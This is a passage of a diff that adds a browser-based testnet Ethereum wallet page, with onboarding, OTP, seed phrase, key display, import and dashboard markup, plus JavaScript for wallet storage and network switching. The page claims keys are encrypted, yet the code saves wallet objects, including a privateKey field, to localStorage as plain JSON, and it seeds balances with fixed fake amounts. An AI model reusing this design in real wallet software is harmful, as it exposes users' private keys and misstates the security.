+          Mini Ethereum Wallet is a non-custodial wallet. You are solely responsible for securing your private keys, seed phrases, and passwords. We cannot recover your funds if you lose access.</p>
+          
+          <p><strong>3. Testnet Usage</strong><br>
+          This wallet currently operates on Ethereum testnets only. Do not send mainnet assets to these addresses.</p>
+          
+          <p><strong>4. Security Responsibilities</strong><br>
+          You are responsible for maintaining the confidentiality of your login credentials and for all activities that occur under your account.</p>
+          
+          <p><strong>5. Privacy</strong><br>
+          We do not collect personally identifiable information. Your data is stored locally on your device and encrypted.</p>
+          
+          <p><strong>6. Limitation of Liability</strong><br>
+          We are not liable for any losses resulting from unauthorized access to your wallet, user error, or technical issues.</p>
+        </div>
+      </div>
+      
+      <div class="checkbox-group">
+        <input type="checkbox" id="agree-terms">
+        <label for="agree-terms">I have read, understood, and agree to the Terms of Service and Privacy Policy</label>
+      </div>
+      
+      <div class="checkbox-group">
+        <input type="checkbox" id="agree-analytics">
+        <label for="agree-analytics">I agree to share anonymous analytics to help improve the wallet (optional)</label>
+      </div>
+      
+      <button id="send-otp-button">
+        <span id="send-otp-text">Continue to Verification</span>
+        <span id="send-otp-loading" class="hidden"><div class="loading"></div> Processing...</span>
+      </button>
+    </div>
+
+    <!-- OTP Verification Page -->
+    <div id="otp-page" class="glass-card hidden">
+      <button class="back-button" id="back-from-otp"><i class="fas fa-arrow-left"></i> Back</button>
+      
+      <div class="logo">
+        <h1>Email Verification</h1>
+        <p>Enter the OTP sent to your email</p>
+        <p id="otp-display" style="color: var(--neon-blue); font-weight: bold; margin-top: 10px;"></p>
+      </div>
+      
+      <div class="otp-container">
+        <input type="text" class="otp-input" maxlength="1" data-index="0">
+        <input type="text" class="otp-input" maxlength="1" data-index="1">
+        <input type="text" class="otp-input" maxlength="1" data-index="2">
+        <input type="text" class="otp-input" maxlength="1" data-index="3">
+        <input type="text" class="otp-input" maxlength="1" data-index="4">
+        <input type="text" class="otp-input" maxlength="1" data-index="5">
+      </div>
+      
+      <button id="verify-otp-button">Verify OTP</button>
+      
+      <div class="link-text">
+        Didn't receive code? <a href="#" id="resend-otp">Resend OTP</a>
+      </div>
+    </div>
+
+    <!-- Create Password Page -->
+    <div id="password-page" class="glass-card hidden">
+      <button class="back-button" id="back-from-password"><i class="fas fa-arrow-left"></i> Back</button>
+      
+      <div class="logo">
+        <h1>Create Password</h1>
+        <p>Set a strong password to secure your wallet</p>
+      </div>
+      
+      <div class="form-group">
+        <label for="wallet-password">Password</label>
+        <input type="password" id="wallet-password" placeholder="Create a strong password">
+        <div class="password-strength" id="password-strength">
+          <div class="password-strength-bar"></div>
+        </div>
+      </div>
+      
+      <div class="form-group">
+        <label for="confirm-password">Confirm Password</label>
+        <input type="password" id="confirm-password" placeholder="Confirm your password">
+      </div>
+      
+      <div class="security-info">
+        <h3><i class="fas fa-info-circle"></i> Password Requirements</h3>
+        <ul>
+          <li>At least 8 characters</li>
+          <li>Include uppercase and lowercase letters</li>
+          <li>Include at least one number</li>
+          <li>Include at least one special character</li>
+        </ul>
+      </div>
+      
+      <button id="create-password-button">Create Password</button>
+    </div>
+
+    <!-- Seed Phrase Display -->
+    <div id="seed-phrase-page" class="glass-card hidden">
+      <button class="back-button" id="back-from-seed"><i class="fas fa-arrow-left"></i> Back</button>
+      
+      <div class="logo">
+        <h1>Secret Recovery Phrase</h1>
+        <p>Save these words in the correct order</p>
+      </div>
+
+      <div class="security-info">
+        <h3><i class="fas fa-exclamation-triangle"></i> Critical Security Step</h3>
+        <p>Your Secret Recovery Phrase is the only way to restore your wallet. Anyone with this phrase can access your funds. Store it securely and never share it with anyone.</p>
+        <ul>
+          <li>Write it down on paper and store in a safe place</li>
+          <li>Do not store it digitally or take screenshots</li>
+          <li>Never share it with anyone, including support staff</li>
+          <li>Consider using a metal backup solution for long-term storage</li>
+        </ul>
+      </div>
+
+      <div class="seed-phrase-container">
+        <div class="seed-phrase" id="seed-phrase-display">
+          <!-- Seed words will be populated here -->
+        </div>
+        <button class="copy-button" id="copy-seed-phrase"><i class="far fa-copy"></i> Copy to Clipboard</button>
+      </div>
+
+      <div class="checkbox-group">
+        <input type="checkbox" id="saved-seed-phrase">
+        <label for="saved-seed-phrase">I have written down my Secret Recovery Phrase and stored it in a secure location</label>
+      </div>
+      
+      <button id="confirm-saved-seed">Continue</button>
+    </div>
+
+    <!-- Confirm Seed Phrase -->
+    <div id="confirm-seed-page" class="glass-card hidden">
+      <button class="back-button" id="back-from-confirm-seed"><i class="fas fa-arrow-left"></i> Back</button>
+      
+      <div class="logo">
+        <h1>Confirm Recovery Phrase</h1>
+        <p>Select each word in the correct order to verify your backup</p>
+      </div>
+
+      <div class="selected-words-container" id="selected-words-container">
+        <!-- Selected words will appear here -->
+      </div>
+
+      <div class="confirm-seed-container">
+        <div class="confirm-seed-grid" id="confirm-seed-options">
+          <!-- Word options will be populated here -->
+        </div>
+      </div>
+      
+      <button id="verify-seed-phrase" disabled>Verify Recovery Phrase</button>
+    </div>
+
+    <!-- Keys Display Page -->
+    <div id="keys-page" class="glass-card hidden">
+      <button class="back-button" id="back-from-keys"><i class="fas fa-arrow-left"></i> Back</button>
+      
+      <div class="logo">
+        <h1>Your Wallet Keys</h1>
+        <p>Important: Save these keys securely</p>
+      </div>
+
+      <div class="security-info">
+        <h3><i class="fas fa-exclamation-triangle"></i> Security Warning</h3>
+        <p>Your private key gives full access to your wallet and funds. Never share it with anyone. Store it securely offline.</p>
+      </div>
+
+      <div class="keys-display-container">
+        <div class="key-item">
+          <div class="key-label">
+            <i class="fas fa-wallet"></i>
+            <h3>Public Address</h3>
+          </div>
+          <div class="key-value-container">
+            <span class="key-text" id="public-address-display">Loading...</span>
+            <button class="copy-button" id="copy-public-address"><i class="far fa-copy"></i> Copy</button>
+          </div>
+        </div>
+        
+        <div class="key-item">
+          <div class="key-label">
+            <i class="fas fa-key"></i>
+            <h3>Private Key</h3>
+          </div>
+          <div class="key-value-container">
+            <span class="key-text" id="private-key-display">Loading...</span>
+            <button class="copy-button" id="copy-private-key"><i class="far fa-copy"></i> Copy</button>
+          </div>
+        </div>
+      </div>
+
+      <div class="checkbox-group">
+        <input type="checkbox" id="saved-keys">
+        <label for="saved-keys">I have securely saved both my public address and private key</label>
+      </div>
+      
+      <button id="confirm-saved-keys">Proceed to Dashboard</button>
+    </div>
+
+    <!-- Login with Private Key or Seed Phrase -->
+    <div id="login-page" class="glass-card hidden">
+      <button class="back-button" id="back-from-login"><i class="fas fa-arrow-left"></i> Back</button>
+      
+      <div class="logo">
+        <div class="logo-icon">
+          <i class="fab fa-ethereum"></i>
+        </div>
+        <h1>Access Your Wallet</h1>
+        <p>Import with private key or seed phrase</p>
+      </div>
+      
+      <div class="tab-container">
+        <div class="tab active" data-tab="private-key"><i class="fas fa-key"></i> Private Key</div>
+        <div class="tab" data-tab="seed-phrase"><i class="fas fa-seedling"></i> Seed Phrase</div>
+      </div>
+      
+      <!-- Private Key Tab -->
+      <div id="private-key-tab" class="tab-content">
+        <div class="form-group">
+          <label for="private-key-login">Private Key</label>
+          <input type="password" id="private-key-login" placeholder="Enter your private key (0x...)">
+          <div class="private-key-warning">
+            <i class="fas fa-exclamation-triangle"></i> Your private key is encrypted and stored only in your browser
+          </div>
+        </div>
+        
+        <button id="login-private-key">Access Wallet</button>
+      </div>
+      
+      <!-- Seed Phrase Tab -->
+      <div id="seed-phrase-tab" class="tab-content hidden">
+        <div class="form-group">
+          <label>Enter Your 12-Word Seed Phrase</label>
+          <div class="seed-phrase-login-container">
+            <div class="seed-phrase-inputs" id="seed-phrase-inputs">
+              <!-- Seed phrase inputs will be populated here -->
+            </div>
+          </div>
+          <div class="private-key-warning">
+            <i class="fas fa-exclamation-triangle"></i> Your seed phrase is encrypted and stored only in your browser
+          </div>
+        </div>
+        
+        <button id="login-seed-phrase">Access Wallet</button>
+      </div>
+      
+      <div class="link-text">
+        Don't have a wallet? <a href="#" id="create-wallet-link">Create New Wallet</a>
+      </div>
+    </div>
+
+    <!-- Wallet Dashboard -->
+    <div id="wallet-dashboard" class="glass-card hidden">
+      <div class="network-indicator">
+        <div class="network-dot"></div>
+        <span id="current-network">Sepolia Testnet</span>
+      </div>
+      
+      <div class="logo">
+        <div class="logo-icon">
+          <i class="fab fa-ethereum"></i>
+        </div>
+        <h1>MINI ETHEREUM WALLET</h1>
+        <p>Next-Gen Blockchain Interface</p>
+      </div>
+      
+      <div class="wallet-info">
+        <div class="wallet-address">
+          <i class="fas fa-wallet"></i>
+          <span id="wallet-address-display">Loading...</span>
+          <button class="copy-button" id="copy-address"><i class="far fa-copy"></i></button>
+        </div>
+        <div class="balance" id="wallet-balance">0 ETH</div>
+      </div>
+      
+      <div class="tab-container">
+        <div class="tab active" data-tab="send"><i class="fas fa-paper-plane"></i> Send</div>
+        <div class="tab" data-tab="receive"><i class="fas fa-wallet"></i> Receive</div>
+        <div class="tab" data-tab="networks"><i class="fas fa-network-wired"></i> Networks</div>
+        <div class="tab" data-tab="history"><i class="fas fa-history"></i> History</div>
+        <div class="tab" data-tab="about"><i class="fas fa-info-circle"></i> About</div>
+      </div>
+      
+      <!-- Send Tab -->
+      <div id="send-tab" class="tab-content">
+        <div class="form-group">
+          <label for="recipient-address">Recipient Address</label>
+          <input type="text" id="recipient-address" placeholder="0x...">
+        </div>
+        
+        <div class="form-group">
+          <label for="send-amount">Amount (ETH)</label>
+          <input type="number" id="send-amount" placeholder="0.0" step="0.001">
+        </div>
+        
+        <div class="self-transfer-warning" id="self-transfer-warning">
+          <h3><i class="fas fa-exclamation-triangle"></i> Invalid Transaction</h3>
+          <p>You cannot send funds to your own wallet address. Please enter a different recipient address.</p>
+        </div>
+        
+        <div class="gas-info">
+          <div>Estimated Gas Fee:</div>
+          <div id="gas-estimate">0 ETH</div>
+        </div>
+        
+        <div class="gas-info">
+          <div>Total (Amount + Gas):</div>
+          <div id="total-estimate">0 ETH</div>
+        </div>
+        
+        <button id="send-transaction-button"><i class="fas fa-paper-plane"></i> Send Transaction</button>
+      </div>
+      
+      <!-- Receive Tab -->
+      <div id="receive-tab" class="tab-content hidden">
+        <div class="wallet-info">
+          <div class="wallet-address">
+            <i class="fas fa-wallet"></i>
+            <span id="receive-address">Loading...</span>
+            <button class="copy-button" id="copy-receive-address"><i class="far fa-copy"></i></button>
+          </div>
+        </div>
+        <p style="text-align: center; margin-top: 15px; color: rgba(255,255,255,0.7);">Share this address to receive ETH</p>
+        
+        <div class="security-info">
+          <h3><i class="fas fa-info-circle"></i> Receiving Funds</h3>
+          <p>Send only ETH (Ethereum) to this address. Sending other tokens may result in permanent loss.</p>
+        </div>
+      </div>
+      
+      <!-- Networks Tab -->
+      <div id="networks-tab" class="tab-content hidden">
+        <div class="network-selector">
+          <h3><i class="fas fa-network-wired"></i> Switch Network</h3>
+          <p>Select a blockchain network to connect to</p>
+          <div class="network-options">
+            <div class="network-option active" data-network="sepolia">
+              <i class="fab fa-ethereum"></i>
+              <div>Sepolia</div>
+              <small>Testnet</small>
+            </div>
+            <div class="network-option" data-network="holesky">
+              <i class="fab fa-ethereum"></i>
+              <div>Holesky</div>
+              <small>Testnet</small>
+            </div>
+            <div class="network-option" data-network="polygon">
+              <i class="fas fa-layer-group"></i>
+              <div>Polygon</div>
+              <small>Testnet</small>
+            </div>
+            <div class="network-option" data-network="arbitrum">
+              <i class="fas fa-bolt"></i>
+              <div>Arbitrum</div>
+              <small>Testnet</small>
+            </div>
+          </div>
+        </div>
+        
+        <div class="api-features">
+          <div class="api-feature">
+            <i class="fas fa-bolt"></i>
+            <h4>Gas API</h4>
+            <p>Optimize transaction costs across all networks</p>
+          </div>
+          <div class="api-feature">
+            <i class="fas fa-search"></i>
+            <h4>Trace API</h4>
+            <p>Debug and analyze transactions</p>
+          </div>
+        </div>
+        
+        <div class="security-info">
+          <h3><i class="fas fa-shield-alt"></i> Decentralized Infrastructure</h3>
+          <p>If API endpoints become unavailable, your dapps stay connected through our partners on the Decentralized Infrastructure Network (DIN)</p>
+        </div>
+      </div>
+      
+      <!-- History Tab -->
+      <div id="history-tab" class="tab-content hidden">
+        <div class="filter-container">
+          <select id="txFilter">
+            <option value="all">All Transactions</option>
+            <option value="in">Received</option>
+            <option value="out">Sent</option>
+          </select>
+          <button id="refreshHistoryBtn" class="refresh-btn"><i class="fas fa-sync-alt"></i> Refresh</button>
+        </div>
+        <div class="transaction-history" id="transaction-history">
+          <!-- Transaction history will be populated here -->
+        </div>
+      </div>
+      
+      <!-- About Tab -->
+      <div id="about-tab" class="tab-content hidden">
+        <div class="motivation-section">
+          <h3><i class="fas fa-rocket"></i> Why Mini Ethereum Wallet?</h3>
+          <p>Mini Ethereum Wallet addresses the key challenges faced by users of traditional cryptocurrency wallets with a focus on security, education, and accessibility.</p>
+        </div>
+
+        <div class="problem-solution-section">
+          <h3><i class="fas fa-trophy"></i> Solving Wallet Problems</h3>
+          
+          <div class="problem-item">
+            <div class="problem-icon">
+              <i class="fas fa-exclamation-triangle"></i>
+            </div>
+            <div class="problem-content">
+              <h4>Complex Setup Process</h4>
+              <p>Traditional wallets require multiple confusing steps</p>
+            </div>
+            <div class="solution-icon">
+              <i class="fas fa-check"></i>
+            </div>
+            <div class="solution-content">
+              <h4>Streamlined Onboarding</h4>
+              <p>Simple 3-step process with clear guidance</p>
+            </div>
+          </div>
+          
+          <div class="problem-item">
+            <div class="problem-icon">
+              <i class="fas fa-shield-alt"></i>
+            </div>
+            <div class="problem-content">
+              <h4>Security Concerns</h4>
+              <p>Private keys and seed phrases are hard to manage securely</p>
+            </div>
+            <div class="solution-icon">
+              <i class="fas fa-check"></i>
+            </div>
+            <div class="solution-content">
+              <h4>Enhanced Security</h4>
+              <p>OTP verification + encrypted local storage + backup options</p>
+            </div>
+          </div>
+          
+          <div class="problem-item">
+            <div class="problem-icon">
+              <i class="fas fa-plug"></i>
+            </div>
+            <div class="problem-content">
+              <h4>Network Limitations</h4>
+              <p>Limited blockchain access and network options</p>
+            </div>
+            <div class="solution-icon">
+              <i class="fas fa-check"></i>
+            </div>
+            <div class="solution-content">
+              <h4>Multi-Network Support</h4>
+              <p>Access to Ethereum, Polygon, Arbitrum, and more with 99.9% uptime</p>
+            </div>
+          </div>
+        </div>
+
+        <div class="security-info">
+          <h3><i class="fas fa-shield-alt"></i> Security Features</h3>
+          <ul>
+            <li>OTP-based email verification for wallet creation</li>
+            <li>Private key and seed phrase authentication options</li>
+            <li>Keys never leave your browser - fully client-side</li>
+            <li>No database storage of sensitive information</li>
+            <li>Client-side transaction signing</li>
+            <li>Encrypted local storage</li>
+          </ul>
+        </div>
+
+        <h3 style="margin: 20px 0 10px; color: var(--gold);">Wallet Comparison</h3>
+        <table class="comparison-table">
+          <thead>
+            <tr>
+              <th>Feature</th>
+              <th>Mini Ethereum Wallet</th>
+              <th>MetaMask</th>
+              <th>Other Wallets</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>OTP Verification</td>
+              <td class="feature-check"><i class="fas fa-check"></i></td>
+              <td class="feature-cross"><i class="fas fa-times"></i></td>
+              <td class="feature-cross"><i class="fas fa-times"></i></td>
+            </tr>
+            <tr>
+              <td>Multi-Network Access</td>
+              <td class="feature-check"><i class="fas fa-check"></i></td>
+              <td class="feature-check"><i class="fas fa-check"></i></td>
+              <td class="feature-cross"><i class="fas fa-times"></i></td>
+            </tr>
+            <tr>
+              <td>No Installation</td>
+              <td class="feature-check"><i class="fas fa-check"></i></td>
+              <td class="feature-cross"><i class="fas fa-times"></i></td>
+              <td class="feature-check"><i class="fas fa-check"></i></td>
+            </tr>
+            <tr>
+              <td>Educational Focus</td>
+              <td class="feature-check"><i class="fas fa-check"></i></td>
+              <td class="feature-cross"><i class="fas fa-times"></i></td>
+              <td class="feature-cross"><i class="fas fa-times"></i></td>
+            </tr>
+          </tbody>
+        </table>
+
+        <button id="export-private-key" class="back-button" style="margin-top: 20px;"><i class="fas fa-key"></i> Export Private Key</button>
+        <button id="disconnect-wallet" class="back-button" style="background: rgba(255, 107, 107, 0.2);"><i class="fas fa-sign-out-alt"></i> Disconnect Wallet</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Notification -->
+  <div id="notification" class="notification">
+    <div id="notification-message">Notification message</div>
+  </div>
+
+  <!-- Browser Toast Notification -->
+  <div id="browser-toast" class="browser-toast">
+    <div id="browser-toast-message">Browser notification</div>
+  </div>
+
+  <script>
+    // EmailJS init
+    emailjs.init("MAMR9NDYW7I5SZJHEIRI1RKQ9JABN31WXH");
+
+    // Particle Animation
+    const canvas = document.getElementById('particle-canvas');
+    const ctx = canvas.getContext('2d');
+    let particles = [];
+
+    function resizeCanvas() {
+      canvas.width = window.innerWidth;
+      canvas.height = window.innerHeight;
+    }
+    window.addEventListener('resize', resizeCanvas);
+    resizeCanvas();
+
+    class Particle {
+      constructor(x, y, size, speedX, speedY) {
+        this.x = x;
+        this.y = y;
+        this.size = size;
+        this.speedX = speedX;
+        this.speedY = speedY;
+        this.opacity = Math.random() * 0.7 + 0.3;
+      }
+      update() {
+        this.x += this.speedX;
+        this.y += this.speedY;
+        if (this.size > 0.2) this.size -= 0.02;
+      }
+      draw() {
+        ctx.fillStyle = `rgba(255, 215, 0, ${this.opacity})`;
+        ctx.beginPath();
+        ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+        ctx.fill();
+      }
+    }
+
+    function createParticles() {
+      for (let i = 0; i < 5; i++) {
+        const x = canvas.width / 2;
+        const y = canvas.height / 2;
+        const size = Math.random() * 4 + 2;
+        const speedX = (Math.random() - 0.5) * 4;
+        const speedY = (Math.random() - 0.5) * 4;
+        particles.push(new Particle(x, y, size, speedX, speedY));
+      }
+    }
+
+    function animate() {
+      ctx.fillStyle = "rgba(0, 0, 0, 0.1)";
+      ctx.fillRect(0, 0, canvas.width, canvas.height);
+      particles.forEach((p, i) => {
+        p.update();
+        p.draw();
+        if (p.size <= 0.2) particles.splice(i, 1);
+      });
+      requestAnimationFrame(animate);
+    }
+    animate();
+    setInterval(createParticles, 80);
+
+    // DOM Elements
+    const introScreen = document.getElementById('intro-screen');
+    const appContainer = document.getElementById('app-container');
+    const setupChoice = document.getElementById('setup-choice');
+    const signupPage = document.getElementById('signup-page');
+    const otpPage = document.getElementById('otp-page');
+    const passwordPage = document.getElementById('password-page');
+    const seedPhrasePage = document.getElementById('seed-phrase-page');
+    const confirmSeedPage = document.getElementById('confirm-seed-page');
+    const keysPage = document.getElementById('keys-page');
+    const loginPage = document.getElementById('login-page');
+    const walletDashboard = document.getElementById('wallet-dashboard');
+    const notification = document.getElementById('notification');
+    const notificationMessage = document.getElementById('notification-message');
+    const otpDisplay = document.getElementById('otp-display');
+    const selfTransferWarning = document.getElementById('self-transfer-warning');
+    const browserToast = document.getElementById('browser-toast');
+    const browserToastMessage = document.getElementById('browser-toast-message');
+
+    // Current network state
+    let currentNetwork = 'sepolia';
+    const networkNames = {
+      'sepolia': 'Sepolia Testnet',
+      'holesky': 'Holesky Testnet',
+      'polygon': 'Polygon Testnet',
+      'arbitrum': 'Arbitrum Testnet'
+    };
+
+    // Etherscan URLs for different networks
+    const etherscanUrls = {
+      'sepolia': 'https://sepolia.etherscan.io',
+      'holesky': 'https://holesky.etherscan.io',
+      'polygon': 'https://mumbai.polygonscan.com',
+      'arbitrum': 'https://testnet.arbiscan.io'
+    };
+
+    // Viem chains for different networks
+    const viemChains = {
+      'sepolia': window.viem ? window.viem.sepolia : null,
+      'holesky': window.viem ? window.viem.holesky : null,
+      'polygon': null, // You would need to import polygon chain
+      'arbitrum': null // You would need to import arbitrum chain
+    };
+
+    // RPC URLs for different networks
+    const rpcUrls = {
+      'sepolia': 'https://ethereum-sepolia-rpc.publicnode.com',
+      'holesky': 'https://ethereum-holesky-rpc.publicnode.com',
+      'polygon': 'https://polygon-mumbai-bor-rpc.publicnode.com',
+      'arbitrum': 'https://arbitrum-sepolia-rpc.publicnode.com'
+    };
+
+    // Initial network balances
+    const initialNetworkBalances = {
+      'sepolia': 3.0,
+      'holesky': 3.0,
+      'polygon': 4.2,
+      'arbitrum': 3.8
+    };
+
+    // Global wallet storage
+    const WALLET_STORAGE_KEY = 'miniEthWallets';
+    const TRANSACTION_STORAGE_KEY = 'miniEthTransactions';
+    const CURRENT_WALLET_KEY = 'currentWallet';
+
+    // Viem Integration Variables
+    let publicClient = null;
+    let walletClient = null;
+    let account = null;
+    let balanceInterval = null;
+
+    // Initialize Viem clients for current network
+    function initializeViemClients() {
+      if (!window.viem) {
+        console.error('Viem library not loaded yet');
+        return false;
+      }
+
+      try {
+        // Get the appropriate chain for the current network
+        const chain = viemChains[currentNetwork] || window.viem.holesky;
+        const rpcUrl = rpcUrls[currentNetwork] || 'https://ethereum-holesky-rpc.publicnode.com';
+
+        publicClient = window.viem.createPublicClient({
+          chain: chain,
+          transport: window.viem.http(rpcUrl),
+        });
+
+        return true;
+      } catch (error) {
+        console.error('Error initializing Viem clients:', error);
+        return false;
+      }
+    }
+
+    // Update Viem clients when network changes
+    function updateViemClients() {
+      if (account && window.viem) {
+        const chain = viemChains[currentNetwork] || window.viem.holesky;
+        const rpcUrl = rpcUrls[currentNetwork] || 'https://ethereum-holesky-rpc.publicnode.com';
+
+        publicClient = window.viem.createPublicClient({
+          chain: chain,
+          transport: window.viem.http(rpcUrl),
+        });
+
+        walletClient = window.viem.createWalletClient({
+          account: account,
+          chain: chain,
+          transport: window.viem.http(rpcUrl),
+        });
+
+        // Restart balance interval
+        if (balanceInterval) clearInterval(balanceInterval);
+        balanceInterval = setInterval(updateViemBalance, 15000);
+        updateViemBalance();
+      }
+    }
+
+    // Initialize storage
+    function initializeStorage() {
+      if (!localStorage.getItem(WALLET_STORAGE_KEY)) {
+        localStorage.setItem(WALLET_STORAGE_KEY, JSON.stringify({}));
+      }
+      if (!localStorage.getItem(TRANSACTION_STORAGE_KEY)) {
+        localStorage.setItem(TRANSACTION_STORAGE_KEY, JSON.stringify({}));
+      }
+    }
+
+    // Get all wallets from storage
+    function getAllWallets() {
+      return JSON.parse(localStorage.getItem(WALLET_STORAGE_KEY) || '{}');
+    }
+
+    // Get wallet by address
+    function getWalletByAddress(address) {
+      const wallets = getAllWallets();
+      return wallets[address.toLowerCase()] || null;
+    }
+
+    // Save wallet to storage
+    function saveWallet(walletData) {
+      const wallets = getAllWallets();
+      wallets[walletData.address.toLowerCase()] = walletData;
+      localStorage.setItem(WALLET_STORAGE_KEY, JSON.stringify(wallets));
+    }
+
+    // Create wallet if it doesn't exist
+    function createWalletIfNotExists(address) {
+      const existingWallet = getWalletByAddress(address);
+      if (existingWallet) return existingWallet;
+      
+      const newWallet = {
+        address: address,
+        privateKey: null, // We don't have the private key for external wallets
+        imported: false,
+        networkBalances: { ...initialNetworkBalances },
+        network: currentNetwork,
+        created: new Date().toISOString()
+      };
+      
+      saveWallet(newWallet);
+      return newWallet;
+    }
+
+    // Get all transactions from storage
+    function getAllTransactions() {
+      return JSON.parse(localStorage.getItem(TRANSACTION_STORAGE_KEY) || '{}');
+    }
+
+    // Get transactions for an address - FIXED VERSION
+    function getTransactionsForAddress(address) {
+      const transactions = getAllTransactions();
+      const addressKey = address.toLowerCase();
+      
+      if (!transactions[addressKey]) {
+        transactions[addressKey] = [];
+        localStorage.setItem(TRANSACTION_STORAGE_KEY, JSON.stringify(transactions));
+      }
+      
+      return transactions[addressKey];
+    }
+
+    // Save transaction to storage - FIXED VERSION
+    function saveTransaction(transaction) {
+      const transactions = getAllTransactions();
+      
+      // Initialize arrays if they don't exist
+      const fromKey = transaction.from.toLowerCase();
+      const toKey = transaction.to.toLowerCase();
+      
+      if (!transactions[fromKey]) {
+        transactions[fromKey] = [];
+      }
+      if (!transactions[toKey]) {
+        transactions[toKey] = [];
+      }
+      
+      // Add transaction to sender's history as 'sent'
+      const sentTransaction = {
+        ...transaction,
+        type: 'sent',
+        direction: 'out'
+      };
+      transactions[fromKey].unshift(sentTransaction);
+      
+      // Only add to receiver's history if it's a different address
+      if (fromKey !== toKey) {
+        const receivedTransaction = {
+          ...transaction,
+          type: 'received',
+          direction: 'in',
+          gasFee: 0 // Receiver doesn't pay gas
+        };
+        transactions[toKey].unshift(receivedTransaction);
+      }
+      
+      localStorage.setItem(TRANSACTION_STORAGE_KEY, JSON.stringify(transactions));
+    }
+
+    // Update wallet balance - FIXED VERSION
+    function updateWalletBalance(address, amount, isAddition = false) {
+      const wallets = getAllWallets();
+      const normalizedAddress = address.toLowerCase();
+      
+      // Create wallet if it doesn't exist
+      if (!wallets[normalizedAddress]) {
+        createWalletIfNotExists(address);
+      }
+      
+      // Get updated wallets after potential creation
+      const updatedWallets = getAllWallets();
+      
+      if (updatedWallets[normalizedAddress]) {
+        if (isAddition) {
+          updatedWallets[normalizedAddress].networkBalances[currentNetwork] += amount;
+        } else {
+          updatedWallets[normalizedAddress].networkBalances[currentNetwork] -= amount;
+        }
+        localStorage.setItem(WALLET_STORAGE_KEY, JSON.stringify(updatedWallets));
+        
+        // Update current wallet if it's the same address
+        const currentWallet = JSON.parse(localStorage.getItem(CURRENT_WALLET_KEY));
+        if (currentWallet && currentWallet.address.toLowerCase() === normalizedAddress) {
+          currentWallet.networkBalances = updatedWallets[normalizedAddress].networkBalances;
+          localStorage.setItem(CURRENT_WALLET_KEY, JSON.stringify(currentWallet));
+        }
+        
+        return updatedWallets[normalizedAddress];
+      }
+      return null;
+    }
+
+    // Navigation Links
+    document.getElementById('start-app').addEventListener('click', startApp);
+    document.getElementById('create-wallet-button').addEventListener('click', () => showPage(signupPage));
+    document.getElementById('import-wallet-button').addEventListener('click', () => showPage(loginPage));
+    document.getElementById('back-from-signup').addEventListener('click', () => showPage(setupChoice));
+    document.getElementById('back-from-otp').addEventListener('click', () => showPage(signupPage));
+    document.getElementById('back-from-password').addEventListener('click', () => showPage(otpPage));
+    document.getElementById('back-from-seed').addEventListener('click', () => showPage(passwordPage));
+    document.getElementById('back-from-confirm-seed').addEventListener('click', () => showPage(seedPhrasePage));
+    document.getElementById('back-from-keys').addEventListener('click', () => showPage(confirmSeedPage));
+    document.getElementById('back-from-login').addEventListener('click', () => showPage(setupChoice));
+    document.getElementById('create-wallet-link').addEventListener('click', () => showPage(signupPage));
+    document.getElementById('disconnect-wallet').addEventListener('click', disconnectWallet);
+    document.getElementById('copy-address').addEventListener('click', () => copyToClipboard('wallet-address-display', 'copy-address'));
+    document.getElementById('copy-receive-address').addEventListener('click', () => copyToClipboard('receive-address', 'copy-receive-address'));
+    document.getElementById('copy-seed-phrase').addEventListener('click', copySeedPhrase);
+    document.getElementById('copy-public-address').addEventListener('click', () => copyToClipboard('public-address-display', 'copy-public-address'));
+    document.getElementById('copy-private-key').addEventListener('click', () => copyToClipboard('private-key-display', 'copy-private-key'));
+    document.getElementById('export-private-key').addEventListener('click', exportPrivateKey);
+
+    // Tab Navigation
+    document.querySelectorAll('.tab').forEach(tab => {
+      tab.addEventListener('click', () => {
+        // Remove active class from all tabs
+        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+        // Add active class to clicked tab
+        tab.classList.add('active');
+        
+        // Hide all tab content
+        document.querySelectorAll('.tab-content').forEach(content => {
+          content.classList.add('hidden');
+        });
+        
+        // Show selected tab content
+        const tabId = `${tab.dataset.tab}-tab`;
+        document.getElementById(tabId).classList.remove('hidden');
+        
+        // Load transaction history when history tab is selected
+        if (tab.dataset.tab === 'history') {
+          loadTransactionHistory();
+        }
+      });
+    });
+
+    // Network Selection
+    document.querySelectorAll('.network-option').forEach(option => {
+      option.addEventListener('click', () => {
+        // Remove active class from all options
+        document.querySelectorAll('.network-option').forEach(opt => opt.classList.remove('active'));
+        // Add active class to clicked option
+        option.classList.add('active');
+        
+        // Update current network
+        const newNetwork = option.dataset.network;
+        
+        // Update wallet data with new network
+        const walletData = JSON.parse(localStorage.getItem(CURRENT_WALLET_KEY));
+        if (walletData) {
+          // Update network in wallet data
+          walletData.network = newNetwork;
+          
+          // If this is the first time switching to this network, initialize balance
+          if (!walletData.networkBalances) {
+            walletData.networkBalances = { ...initialNetworkBalances };
+          }
+          
+          // If this network doesn't have a balance yet, initialize it
+          if (!walletData.networkBalances[newNetwork]) {
+            walletData.networkBalances[newNetwork] = initialNetworkBalances[newNetwork];
+          }
+          
+          localStorage.setItem(CURRENT_WALLET_KEY, JSON.stringify(walletData));
+          saveWallet(walletData);
+          
+          // Update UI
+          currentNetwork = newNetwork;
+          document.getElementById('current-network').textContent = networkNames[currentNetwork];
+          document.getElementById('wallet-balance').textContent = `${walletData.networkBalances[currentNetwork].toFixed(4)} ETH`;
+          
+          showNotification(`Switched to ${networkNames[currentNetwork]}`, 'success');
+          
+          // Update Viem clients for new network
+          updateViemClients();
+          
+          // Reload transaction history if on history tab
+          if (document.querySelector('.tab.active').dataset.tab === 'history') {
+            loadTransactionHistory();
+          }
+        }
+      });
+    });
+
+    // Form Submissions
+    document.getElementById('send-otp-button').addEventListener('click', sendOTP);
+    document.getElementById('verify-otp-button').addEventListener('click', verifyOTP);
+    document.getElementById('create-password-button').addEventListener('click', createPassword);
+    document.getElementById('confirm-saved-seed').addEventListener('click', confirmSavedSeed);
+    document.getElementById('verify-seed-phrase').addEventListener('click', verifySeedPhrase);
+    document.getElementById('confirm-saved-keys').addEventListener('click', confirmSavedKeys);
+    document.getElementById('login-private-key').addEventListener('click', loginWithPrivateKey);
+    document.getElementById('login-seed-phrase').addEventListener('click', loginWithSeedPhrase);
+    document.getElementById('send-transaction-button').addEventListener('click', sendTransaction);
+    document.getElementById('resend-otp').addEventListener('click', resendOTP);
+    document.getElementById('refreshHistoryBtn').addEventListener('click', refreshHistory);
+
+    // Password strength indicator
